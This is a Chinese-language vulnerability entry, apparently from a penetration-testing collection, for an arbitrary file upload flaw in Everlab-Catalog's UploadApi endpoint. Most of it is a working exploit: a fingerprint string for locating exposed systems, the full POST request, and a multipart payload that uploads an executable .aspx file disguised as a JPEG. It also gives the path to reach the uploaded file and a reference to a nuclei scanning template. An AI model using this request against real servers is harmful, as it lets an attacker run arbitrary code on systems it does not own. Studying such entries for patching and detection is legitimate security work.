# Everlab-CatalogUploadApi存在文件上传漏洞

- **系统**：Everlab　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="Everlab-Catalog"`
- **请求**：`POST /Util/UploadApi HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 345`　`Content-Type: multipart/form-data; boundary=---------------------------715…`

**请求体 / payload**
```
-----------------------------7153094104923513110228090822
Content-Disposition: form-data; name="Filedata"; filename="ckviaxtcmw.aspx"
Content-Type: image/jpeg
<%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
-----------------------------7153094104923513110228090822--

上传文件位置
GET /upload/2023/12/25/bef4dd40-de3b-4139-837a-784f534a1e00.aspx HTTP/1.1
Host: {hostname}

nuclei脚本\
\[Everlab-Catalog-uploadapi-任意文件上传.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- Everlab-Catalog UploadApi存在文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Everlab-Catalog